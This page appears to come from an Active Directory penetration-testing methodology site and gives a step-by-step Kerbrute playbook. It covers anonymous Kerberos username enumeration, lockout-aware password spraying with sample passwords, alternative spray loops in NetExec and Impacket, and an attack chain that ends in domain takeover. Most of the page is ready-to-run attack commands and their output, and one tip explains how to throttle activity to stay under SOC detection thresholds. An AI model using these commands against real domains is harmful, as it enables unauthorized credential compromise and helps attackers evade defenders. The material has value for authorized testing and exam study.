---
layout: default
title: "Kerbrute — User Enumeration & Password Spraying"
order: 1
phase: "ENUM"
tactic: "Recon / Credential Access"
summary: "Anonymously enumerate valid domain usernames via Kerberos pre-auth, then run safe, lockout-aware password sprays."
---

{% include ad_nav.html %}

# Kerbrute — User Enumeration & Password Spraying

## Pre-requisites

<div class="badges">
  <span class="badge req">Network access to the DC (TCP/UDP 88)</span>
  <span class="badge req">Valid domain FQDN (e.g. corp.local)</span>
  <span class="badge req">A username wordlist</span>
  <span class="badge req">Clock synced to DC</span>
</div>

- Reachability to the **KDC** (Domain Controller) on port **88** (Kerberos).
- The internal **domain name** (`corp.local`). Get it from nmap `-sV`, LDAP naming contexts, or the SMB banner.
- A candidate username list — `jsmith.txt`, SecLists `xato-net-10-million-usernames.txt`, or names harvested from the company website / LinkedIn / `enum4linux`.
- No credentials required for enumeration.

## Mechanism & Theory

Kerberos pre-authentication is the key. When a client requests a TGT (`AS-REQ`) for a **user that does not exist**, the KDC replies `KDC_ERR_C_PRINCIPAL_UNKNOWN`. For a user that **does exist**, the KDC instead demands pre-authentication (`KDC_ERR_PREAUTH_REQUIRED`). Kerbrute abuses this difference: by sending AS-REQs and reading the error code, it distinguishes valid from invalid usernames **without ever submitting a password** — so it does **not** increment the account's bad-password count and does **not** cause lockouts during enumeration.

```terminal
AS-REQ (user=nonexistent)  ──►  KDC  ──►  KDC_ERR_C_PRINCIPAL_UNKNOWN     [invalid]
AS-REQ (user=jsmith)       ──►  KDC  ──►  KDC_ERR_PREAUTH_REQUIRED        [VALID]
AS-REQ (user=svc_backup)   ──►  KDC  ──►  AS-REP with no pre-auth         [VALID + AS-REP roastable!]
```

<div class="callout info">
  <span class="callout-title">Bonus</span>
  If enumeration returns an account whose reply is a full <strong>AS-REP</strong> instead of a pre-auth error, that account has "Do not require Kerberos pre-authentication" set — feed it straight into <a href="/AD_metodology/asrep-roasting/">AS-REP Roasting</a>.
</div>

<div class="attack-diagram">
  <div class="diag-title">Kerbrute — enumeration to first credential</div>
  <div class="diag-flow">
    <div class="diag-node start"><span class="n-step">STEP 1</span><span class="n-title">Username wordlist</span><span class="n-tool">SecLists / OSINT</span></div>
    <div class="diag-arrow">&rarr;</div>
    <div class="diag-node"><span class="n-step">STEP 2</span><span class="n-title">Enumerate (no pw)</span><span class="n-tool">kerbrute userenum</span></div>
    <div class="diag-arrow">&rarr;</div>
    <div class="diag-node"><span class="n-step">STEP 3</span><span class="n-title">Valid users</span><span class="n-tool">valid_users.txt</span></div>
    <div class="diag-arrow">&rarr;</div>
    <div class="diag-node"><span class="n-step">STEP 4</span><span class="n-title">Check lockout</span><span class="n-tool">nxc --pass-pol</span></div>
    <div class="diag-arrow">&rarr;</div>
    <div class="diag-node"><span class="n-step">STEP 5</span><span class="n-title">Password spray</span><span class="n-tool">1 pw / window</span></div>
    <div class="diag-arrow">&rarr;</div>
    <div class="diag-node win"><span class="n-step">STEP 6</span><span class="n-title">Valid credential</span><span class="n-tool">foothold</span></div>
  </div>
</div>

## Step-by-step

### 1. Install / build

```bash
# Precompiled release (recommended)
wget https://github.com/ropnop/kerbrute/releases/latest/download/kerbrute_linux_amd64 -O kerbrute
chmod +x kerbrute && sudo mv kerbrute /usr/local/bin/kerbrute
kerbrute version
```

### 2. Enumerate valid usernames

```bash
export DC=10.10.10.100
export DOMAIN=corp.local

kerbrute userenum --dc $DC -d $DOMAIN /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt -o kerbrute_users.txt
```

Realistic output:

```terminal
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3

2026/06/25 13:02:11 >  Using KDC(s):
2026/06/25 13:02:11 >   10.10.10.100:88

2026/06/25 13:02:12 >  [+] VALID USERNAME:  jsmith@corp.local
2026/06/25 13:02:12 >  [+] VALID USERNAME:  administrator@corp.local
2026/06/25 13:02:13 >  [+] VALID USERNAME:  svc_backup@corp.local
2026/06/25 13:02:13 >  [+] VALID USERNAME:  m.rossi@corp.local
2026/06/25 13:02:14 >  [+] svc_sql@corp.local has no pre auth required. Dumping hash:
$krb5asrep$23$svc_sql@CORP.LOCAL:2b8f...<snip>...9c1a
2026/06/25 13:02:20 >  Done! Tested 10000 usernames (5 valid) in 8.44 seconds
```

Cleaned output, ready for spraying / roasting:

```terminal
$ grep 'VALID USERNAME' kerbrute_users.txt | awk '{print $NF}' | cut -d'@' -f1 | sort -u
jsmith
administrator
svc_backup
m.rossi
svc_sql          # <- "no pre auth required" -> also AS-REP roastable
```

Enumeration funnel (how the wordlist collapses to a credential):

```terminal
   10,000 usernames  (wordlist)
        |  kerbrute userenum   (passwordless, no lockouts)
        v
      5 VALID  ---------------------->  valid_users.txt
        |                                    |
        | 1 has "no pre-auth"                | password spray (1 pw / window)
        v                                    v
   AS-REP Roasting  (free hash)        m.rossi : Welcome2026!
```

### 3. Turn hits into a clean userlist

```bash
grep 'VALID USERNAME' kerbrute_users.txt | awk '{print $NF}' | cut -d'@' -f1 | sort -u > valid_users.txt
wc -l valid_users.txt
```

### 4. Password spraying (careful, lockout-aware)

<div class="callout danger">
  <span class="callout-title">DANGER — Account lockout</span>
  Every failed <em>spray</em> attempt DOES increment badPwdCount. Check the domain lockout policy first and spray <strong>ONE password across ALL users</strong>, then wait for the observation window before the next password. Never loop many passwords against one user.
</div>

```bash
# Read the lockout policy BEFORE spraying (null session or any creds)
nxc smb $DC -u '' -p '' --pass-pol

# Spray a single seasonal/default password across all valid users
kerbrute passwordspray --dc $DC -d $DOMAIN valid_users.txt 'Welcome2026!' -o spray_hits.txt

# Common exam passwords to try (one per window): Password123!, Welcome1, <Season><Year>!, Company123
```

Successful spray:

```terminal
2026/06/25 13:40:02 >  [+] VALID LOGIN:  m.rossi@corp.local:Welcome2026!
2026/06/25 13:40:05 >  Done! Tested 47 logins (1 success) in 3.10 seconds
```

### 5. Alternative sprayers

```bash
# NetExec (also confirms local admin with the (Pwn3d!) flag)
nxc smb $DC -u valid_users.txt -p 'Welcome2026!' --continue-on-success

# Impacket, per-account (use only when you know the lockout threshold is safe)
for u in $(cat valid_users.txt); do impacket-getTGT $DOMAIN/$u:'Welcome2026!' 2>/dev/null && echo "HIT: $u"; done
```

## Complete Attack Chain

```terminal
[1] nmap $DC              ─► identify Kerberos/88 + domain corp.local
[2] enum4linux-ng / --rid-brute ─► seed a username list
[3] kerbrute userenum     ─► valid_users.txt (+ maybe an AS-REP roastable account)
[4] nxc --pass-pol        ─► confirm lockout threshold (e.g. 5 / 30 min)
[5] kerbrute passwordspray ─► m.rossi:Welcome2026!  (1 valid credential)
        │
        ├─► feed valid users into AS-REP Roasting  (no creds needed)
        ├─► use m.rossi creds  ─► BloodHound collection
        └─► use m.rossi creds  ─► Kerberoasting  ─► crack svc account
                                    │
                                    ▼
                        privilege escalation via ACL / AD CS
                                    │
                                    ▼
                            DCSync ─► Golden Ticket ─► Domain owned
```

<div class="callout opsec">
  <span class="callout-title">Detection</span>
  Mass enumeration and spraying generate <strong>Event ID 4768</strong> (TGT requested) and <strong>4771</strong> (pre-auth failed) on the DC. Throttle with <code>--delay</code> and small user batches to stay under SOC thresholds.
</div>

## Key Takeaways

- Enumeration is **passwordless and lockout-safe**; spraying is **not** — respect the policy.
- One password × all users × one attempt per window = the safe spray pattern.
- Any "no pre auth required" hit is a free credential-access win via AS-REP Roasting.

{% include toc_sidebar.html %}
